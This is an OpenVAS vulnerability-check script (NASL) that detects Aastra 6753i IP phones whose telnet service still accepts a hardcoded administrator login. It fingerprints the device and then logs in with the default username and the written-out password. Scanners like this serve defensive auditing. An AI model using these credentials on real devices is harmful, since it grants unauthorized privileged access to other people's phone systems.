##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_aastra_ip_telephone_telnet_sec_bypass_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Aastra IP Telephone Hardcoded Telnet Password Security Bypass Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to access the device and gain
  privileged access.
  Impact Level: Application";
tag_affected = "Aastra 6753i IP Telephone";


tag_insight = "Aastra 6753i IP Phone installs with default hard coded administrator
  credentials (username/password combination).";
tag_solution = "No solution or patch is available as of 09th, April 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.aastrausa.com/index.htm";
tag_summary = "This host is running Aastra IP Telephone and is prone to security
  bypass vulnerability.";

if(description)
{
  script_id(803190);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-04-09 15:08:24 +0530 (Tue, 09 Apr 2013)");
  script_name("Aastra IP Telephone Hardcoded Telnet Password Security Bypass Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_description(desc);
  script_xref(name : "URL" , value : "http://www.osvdb.org/92107");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2013/Apr/42");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/526207");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/aastra-ip-telephone-hardcoded-password");
  script_summary("Try to login with hard coded telnet password");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("General");
  script_require_ports("Services/www", 80, "Services/telnet", 23);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("telnet_func.inc");

## Variable Initialization
soc= "";
port = "";
resp = "";
tport = "";
banner = "";
tbanner = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Get the telnet port
tport = get_kb_item("Services/telnet");
if(!tport){
  tport = 23;
}

## if any one of the port is down then exit
if(!get_port_state(port) || !get_port_state(tport)){
  exit(0);
}

## Confirm the application
banner = get_http_banner(port:port);
if('Basic realm="Aastra 6753i"' >!< banner){
  exit(0);
}

## check telnet port is running and responding
tbanner = get_telnet_banner(port:tport);
if("VxWorks login:" >!< tbanner){
  exit(0);
}

## Create socket
soc = open_sock_tcp(tport);
if(!soc){
  exit(0);
}

## send the hardheaded user name
send(socket:soc, data:string("admin","\r\n"));
resp = recv(socket:soc, length:4096);

## confirm server is running
if("Password:" >< resp)
{
   ## send the hard coded password
  send(socket:soc, data:string("[M]qozn~","\r\n"));
  resp = recv(socket:soc, length:4096);

  ## confirm the login
  if("->" >< resp && "Login incorrect" >!< resp)
  {
    security_hole(port:tport);
    close(soc);
    exit(0);
  }
}
close(soc);
